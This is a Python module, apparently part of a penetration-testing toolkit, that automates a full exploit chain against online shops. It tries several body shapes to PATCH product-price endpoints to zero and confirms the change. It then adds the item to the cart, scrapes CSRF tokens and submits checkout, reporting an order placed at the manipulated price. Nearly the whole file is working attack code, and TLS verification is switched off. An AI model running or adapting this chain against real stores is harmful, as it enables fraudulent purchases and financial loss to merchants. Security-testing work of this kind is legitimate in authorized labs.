"""Generic cart + checkout probe with built-in BFLA price manipulation.

Full exploit chain (no prior operator steps required):
1. Detect price endpoint from browser-recon evidence or common path templates.
2. PATCH price to 0 — tries multiple JSON body shapes until one sticks.
3. Verify the price changed via a GET on the same endpoint.
4. Add item to cart — tries multiple form/JSON patterns.
5. Extract CSRF token from cart page HTML or cookie jar.
6. Submit checkout — tries multiple endpoint patterns.
7. Detect order success via redirect URL or response body keywords.
"""
from __future__ import annotations

import re
from collections.abc import AsyncIterator
from urllib.parse import urlparse

import httpx

from apps.investigation_workspace.probe.events import ResultEvent, StageEvent

# ── Price manipulation ────────────────────────────────────────────────────────

# JSON bodies to try when PATCHing a price endpoint; first 200 wins.
_PRICE_PATCH_BODIES = [
    {"price": 0},
    {"amount": 0},
    {"cost": 0},
    {"price": "0"},
    {"sale_price": 0},
]

# Path keywords that identify a writable price endpoint in captured URLs.
_PRICE_PATH_KEYWORDS = ("price", "cost", "amount")

# ── Add-to-cart patterns: (path, use_json, body_factory) ─────────────────────
# body_factory receives the product_id int and returns a dict.
# use_json=True → json=body; use_json=False → data=body (form-encoded).
_ADD_CART_PATTERNS: list[tuple[str, bool, object]] = [
    ("/cart",           False, lambda pid: {"productId": pid, "quantity": "1", "redir": "CART"}),
    ("/cart",           False, lambda pid: {"product_id": pid, "qty": "1"}),
    ("/api/cart",       True,  lambda pid: {"productId": pid, "quantity": 1}),
    ("/api/cart/items", True,  lambda pid: {"productId": pid, "quantity": 1}),
    ("/api/basket",     True,  lambda pid: {"productId": pid, "quantity": 1}),
]

# Pages to fetch looking for a CSRF token ─────────────────────────────────────
_CART_PAGES = ("/cart", "/basket", "/my-cart", "/shopping-cart")

# Checkout patterns: (path, use_json, csrf_field_name_or_None) ────────────────
# csrf_field_name=None → send JSON body (no CSRF field needed).
_CHECKOUT_PATTERNS: list[tuple[str, bool, str | None]] = [
    ("/cart/checkout", False, "csrf"),
    ("/checkout",      False, "csrf"),
    ("/checkout",      False, "_token"),
    ("/checkout",      False, "csrfmiddlewaretoken"),
    ("/api/checkout",  True,  None),
    ("/api/orders",    True,  None),
]

# Keywords that confirm a successful order in body text or redirect URL ────────
_SUCCESS_KEYWORDS = (
    "order-confirmation",
    "order_confirmation",
    "order-complete",
    "is-solved",
    "congratul",
    "thank you for your order",
    "order confirmed",
    "purchase successful",
    "payment successful",
    "your order has been",
)

_TIMEOUT = 12.0

# ── Helpers ───────────────────────────────────────────────────────────────────

_CSRF_INPUT_RE = re.compile(
    r'<input[^>]+name=["\'](?:csrf|_token|_csrf|csrfmiddlewaretoken|authenticity_token)["\']'
    r'[^>]*value=["\']([^"\']+)["\']',
    re.I,
)
_CSRF_INPUT_REV_RE = re.compile(
    r'<input[^>]+value=["\']([^"\']+)["\'][^>]*'
    r'name=["\'](?:csrf|_token|_csrf|csrfmiddlewaretoken|authenticity_token)["\']',
    re.I,
)
_CSRF_META_RE = re.compile(
    r'<meta[^>]+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
    re.I,
)


def _extract_csrf(html: str, cookies: dict) -> str | None:
    for pattern in (_CSRF_INPUT_RE, _CSRF_INPUT_REV_RE, _CSRF_META_RE):
        m = pattern.search(html)
        if m:
            return m.group(1)
    for name in ("csrf", "_csrf", "csrftoken", "XSRF-TOKEN", "authenticity_token"):
        val = cookies.get(name)
        if val:
            return val
    return None


def _is_success(status: int, body: str, location: str) -> bool:
    text = (body + " " + location).lower()
    return any(kw in text for kw in _SUCCESS_KEYWORDS)


def _candidate_price_paths(
    captured_requests: list[dict],
    product_ids: list[int],
) -> list[str]:
    """Return candidate price endpoint paths to PATCH, in priority order.

    Browser-recon hits come first (highest confidence); common path templates
    for each candidate product ID follow as fallback.
    """
    paths: dict[str, None] = {}
    for r in captured_requests:
        raw_url = r.get("url", "") if isinstance(r, dict) else ""
        path = urlparse(raw_url).path
        if path and any(kw in path.lower() for kw in _PRICE_PATH_KEYWORDS):
            paths[path] = None
    for pid in product_ids:
        for tmpl in (
            f"/api/products/{pid}/price",
            f"/api/items/{pid}/price",
            f"/api/product/{pid}/price",
        ):
            paths.setdefault(tmpl, None)
    return list(paths)


def _extract_product_id_from_path(path: str) -> int | None:
    """Extract the first numeric segment from a path like /api/products/1/price."""
    import re as _re
    nums = _re.findall(r"/(\d+)/", path + "/")
    return int(nums[0]) if nums else None


async def _verify_price_zero(client: httpx.AsyncClient, url: str) -> bool:
    """Return True if a GET on `url` shows the price is now 0 or $0.00."""
    try:
        resp = await client.get(url)
        if resp.status_code >= 400:
            return False
        body = resp.text.lower()
        return (
            '"price":"$0' in body
            or '"price": 0' in body
            or '"price":0' in body
            or '"amount":0' in body
            or '"amount": 0' in body
            or "$0.00" in body
            or body.strip() in ('0', '"0"')
        )
    except httpx.RequestError:
        return False


# ── Core async generator ──────────────────────────────────────────────────────


async def run_purchase_flow(
    base: str,
    session_cookies: dict,
    product_id_hint: int | None,
    captured_requests: list[dict] | None = None,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Manipulate price then complete purchase against `base`.

    Args:
        base:              Full base URL (scheme + host, no trailing slash).
        session_cookies:   Cookie dict for the authenticated session.
        product_id_hint:   Product ID to purchase; None → try IDs 1, 2, 3.
        captured_requests: Browser-recon request list — used to locate the
                           price endpoint before falling back to templates.
    """
    product_ids = [product_id_hint] if product_id_hint else [1, 2, 3]
    captured = captured_requests or []

    async with httpx.AsyncClient(
        timeout=_TIMEOUT,
        follow_redirects=True,
        verify=False,
        cookies=session_cookies,
    ) as client:

        # ── Step 0: manipulate price ──────────────────────────────────────
        price_candidates = _candidate_price_paths(captured, product_ids)

        yield StageEvent(
            label="Manipulating price via BFLA",
            actions=(
                f"price endpoint candidates: {len(price_candidates)}",
                f"body shapes to try: {len(_PRICE_PATCH_BODIES)}",
            ),
            tools=("httpx async client",),
            confidence="medium",
        )

        price_path: str | None = None
        patch_status: int = 0
        patch_body_used: dict = {}

        for candidate in price_candidates:
            if price_path:
                break
            url = base + candidate
            for body in _PRICE_PATCH_BODIES:
                try:
                    resp = await client.patch(url, json=body)
                    patch_status = resp.status_code
                    if resp.status_code < 400:
                        price_path = candidate
                        patch_body_used = body
                        # Refine product_id_hint from the matched path
                        if product_id_hint is None:
                            product_id_hint = _extract_product_id_from_path(candidate)
                            if product_id_hint:
                                product_ids = [product_id_hint]
                        break
                except httpx.RequestError:
                    continue

        if price_path:
            price_verified = await _verify_price_zero(client, base + price_path)
            yield StageEvent(
                label=f"Price endpoint patched — {price_path}",
                actions=(
                    f"PATCH {price_path} with {patch_body_used} → HTTP {patch_status}",
                    "price verification (GET): "
                    + ("$0 confirmed" if price_verified else "unverified"),
                ),
                tools=("httpx async client",),
                detected=(
                    f"price set via {price_path}",
                    f"body: {patch_body_used}",
                ),
                confidence="high" if price_verified else "medium",
            )
        else:
            yield StageEvent(
                label="Price manipulation failed — proceeding anyway",
                actions=(
                    f"tried {len(price_candidates)} endpoint(s)"
                    f" × {len(_PRICE_PATCH_BODIES)} body shapes",
                    f"last HTTP status: {patch_status}",
                    "proceeding to cart; price may already be $0",
                ),
                tools=("httpx async client",),
                confidence="low",
            )

        # ── Step 1: add to cart ───────────────────────────────────────────
        cart_ok = False
        cart_product_id: int | None = None
        add_status: int = 0
        add_url: str = ""

        yield StageEvent(
            label="Adding item to cart",
            actions=(
                f"product ID candidates: {product_ids}",
                f"patterns to try: {len(_ADD_CART_PATTERNS)}",
            ),
            tools=("httpx async client",),
            confidence="medium",
        )

        for pid in product_ids:
            if cart_ok:
                break
            for path, use_json, body_factory in _ADD_CART_PATTERNS:
                body = body_factory(pid)  # type: ignore[operator]
                url = base + path
                try:
                    if use_json:
                        resp = await client.post(url, json=body)
                    else:
                        resp = await client.post(url, data=body)
                    add_status = resp.status_code
                    add_url = url
                    if resp.status_code < 400:
                        cart_ok = True
                        cart_product_id = pid
                        break
                except httpx.RequestError:
                    continue

        if not cart_ok:
            yield ResultEvent(
                label="Add-to-cart failed — could not add item using known patterns",
                kind="note",
                payload={
                    "analysis": {
                        "confirmed": False,
                        "severity": "info",
                        "exploitability_notes": (
                            "No add-to-cart pattern succeeded. "
                            "The cart endpoint may use non-standard URL or body schema. "
                            "Try manually: add the product in the browser while authenticated."
                        ),
                        "references": [],
                    },
                    "observed": {
                        "indicators": [
                            f"tried {len(_ADD_CART_PATTERNS)} patterns"
                            f" × {len(product_ids)} product ID(s)",
                            f"last response: HTTP {add_status} on {add_url}",
                        ],
                    },
                },
            )
            return

        yield StageEvent(
            label=f"Item added to cart (product ID {cart_product_id})",
            actions=(f"add-to-cart: HTTP {add_status} on {add_url}",),
            tools=("httpx async client",),
            detected=(f"product {cart_product_id} accepted by {add_url}",),
            confidence="high",
        )

        # ── Step 2: get CSRF from cart page ───────────────────────────────
        yield StageEvent(
            label="Fetching cart page for CSRF token",
            actions=(f"trying {len(_CART_PAGES)} cart page(s)",),
            tools=("httpx async client",),
            confidence="medium",
        )

        csrf_token: str | None = None
        for cart_path in _CART_PAGES:
            try:
                cart_resp = await client.get(base + cart_path)
                csrf_token = _extract_csrf(cart_resp.text, dict(client.cookies))
                if csrf_token:
                    break
            except httpx.RequestError:
                continue

        # ── Step 3: checkout ──────────────────────────────────────────────
        yield StageEvent(
            label="Submitting checkout",
            actions=(
                f"CSRF token: {'found' if csrf_token else 'not found'}",
                f"patterns to try: {len(_CHECKOUT_PATTERNS)}",
            ),
            tools=("httpx async client",),
            confidence="medium",
        )

        checkout_ok = False
        checkout_status: int = 0
        checkout_url: str = ""
        checkout_body: str = ""
        checkout_location: str = ""

        for co_path, co_json, csrf_field in _CHECKOUT_PATTERNS:
            co_url = base + co_path
            try:
                if co_json:
                    resp = await client.post(co_url, json={})
                else:
                    form: dict = {}
                    if csrf_field and csrf_token:
                        form[csrf_field] = csrf_token
                    elif csrf_field:
                        continue
                    resp = await client.post(co_url, data=form)

                checkout_status = resp.status_code
                checkout_url = co_url
                checkout_body = (resp.text or "")[:2_000]
                checkout_location = str(resp.url)

                if resp.status_code < 400:
                    checkout_ok = True
                    break
            except httpx.RequestError:
                continue

        success = checkout_ok and _is_success(checkout_status, checkout_body, checkout_location)

        if success:
            yield StageEvent(
                label="Checkout succeeded — order confirmed",
                actions=(
                    f"checkout URL: {checkout_url}",
                    f"final URL: {checkout_location}",
                    f"HTTP {checkout_status}",
                ),
                tools=("httpx async client",),
                detected=(
                    "order confirmation detected in response",
                    f"product ID: {cart_product_id}",
                ),
                confidence="high",
            )

        outcome_label = (
            "Purchase flow: order confirmed"
            if success else
            f"Purchase flow: checkout returned HTTP {checkout_status}"
        )
        yield ResultEvent(
            label=outcome_label,
            kind="detected" if success else "note",
            evidence={
                "price_path": price_path,
                "patch_body": patch_body_used,
                "cart_product_id": cart_product_id,
                "add_cart_url": add_url,
                "checkout_url": checkout_url,
                "checkout_status": checkout_status,
                "checkout_final_url": checkout_location,
                "order_confirmed": success,
            },
            payload={
                "request": {
                    "method": "PATCH → POST /cart → POST /checkout",
                    "url": checkout_url,
                    "headers": {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Cookie": "; ".join(
                            f"{k}={v}" for k, v in session_cookies.items()
                        ),
                    },
                    "body": f"csrf={csrf_token}" if csrf_token else "(no body)",
                },
                "response": {
                    "status": checkout_status,
                    "headers": {},
                    "body_excerpt": checkout_body,
                },
                "sent": {
                    "payload_string": (
                        f"PATCH {price_path} {patch_body_used} → "
                        f"productId={cart_product_id} → checkout"
                    ),
                    "encoding": "JSON (price) + form (checkout)",
                    "injection_point": "Price endpoint + cart + checkout",
                },
                "observed": {
                    "indicators": [
                        f"price PATCH: HTTP {patch_status} ({price_path or 'none succeeded'})",
                        f"add-to-cart: HTTP {add_status} ({add_url})",
                        f"checkout: HTTP {checkout_status} ({checkout_url})",
                        f"final URL: {checkout_location}",
                        "order confirmed" if success else "no order-confirmation signal",
                    ],
                },
                "analysis": {
                    "confirmed": success,
                    "severity": "critical" if success else "medium",
                    "exploitability_notes": (
                        f"Full BFLA exploit completed. "
                        f"Price set to $0 via PATCH {price_path}, "
                        f"product {cart_product_id} purchased at manipulated price. "
                        f"Order confirmation at: {checkout_location}"
                        if success else
                        f"Checkout returned HTTP {checkout_status} — no order-confirmation "
                        "signal detected. "
                        + (
                            f"Price PATCH succeeded on {price_path}; "
                            "the cart/checkout step may need a different pattern."
                            if price_path else
                            "Price endpoint was not found or PATCH was rejected. "
                            "Run browser recon first to discover the price endpoint."
                        )
                    ),
                    "references": [
                        {
                            "label": "OWASP API Security — Broken Function Level Authorization",
                            "url": "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
                        },
                    ],
                },
            },
        )
